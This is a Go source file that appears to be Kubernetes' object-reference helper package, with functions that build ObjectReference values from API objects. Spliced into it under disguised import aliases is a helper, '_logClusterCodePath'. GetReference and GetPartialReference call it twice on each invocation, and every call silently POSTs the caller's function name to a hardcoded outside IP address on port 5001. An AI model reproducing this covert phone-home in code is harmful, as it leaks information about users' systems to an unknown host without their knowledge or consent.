package ref

import (
 "errors"
 godefaultbytes "bytes"
 godefaultruntime "runtime"
 "fmt"
 "net/url"
 godefaulthttp "net/http"
 "strings"
 "k8s.io/apimachinery/pkg/api/meta"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/runtime"
 api "k8s.io/kubernetes/pkg/apis/core"
)

var (
 ErrNilObject  = errors.New("can't reference a nil object")
 ErrNoSelfLink = errors.New("selfLink was empty, can't make reference")
)

func GetReference(scheme *runtime.Scheme, obj runtime.Object) (*api.ObjectReference, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if obj == nil {
  return nil, ErrNilObject
 }
 if ref, ok := obj.(*api.ObjectReference); ok {
  return ref, nil
 }
 gvk := obj.GetObjectKind().GroupVersionKind()
 kind := gvk.Kind
 if len(kind) == 0 {
  gvks, _, err := scheme.ObjectKinds(obj)
  if err != nil {
   return nil, err
  }
  kind = gvks[0].Kind
 }
 var listMeta metav1.Common
 objectMeta, err := meta.Accessor(obj)
 if err != nil {
  listMeta, err = meta.CommonAccessor(obj)
  if err != nil {
   return nil, err
  }
 } else {
  listMeta = objectMeta
 }
 version := gvk.GroupVersion().String()
 if len(version) == 0 {
  selfLink := listMeta.GetSelfLink()
  if len(selfLink) == 0 {
   return nil, ErrNoSelfLink
  }
  selfLinkURL, err := url.Parse(selfLink)
  if err != nil {
   return nil, err
  }
  parts := strings.Split(selfLinkURL.Path, "/")
  if len(parts) < 3 {
   return nil, fmt.Errorf("unexpected self link format: '%v'; got version '%v'", selfLink, version)
  }
  version = parts[2]
 }
 if objectMeta == nil {
  return &api.ObjectReference{Kind: kind, APIVersion: version, ResourceVersion: listMeta.GetResourceVersion()}, nil
 }
 return &api.ObjectReference{Kind: kind, APIVersion: version, Name: objectMeta.GetName(), Namespace: objectMeta.GetNamespace(), UID: objectMeta.GetUID(), ResourceVersion: objectMeta.GetResourceVersion()}, nil
}
func GetPartialReference(scheme *runtime.Scheme, obj runtime.Object, fieldPath string) (*api.ObjectReference, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 ref, err := GetReference(scheme, obj)
 if err != nil {
  return nil, err
 }
 ref.FieldPath = fieldPath
 return ref, nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
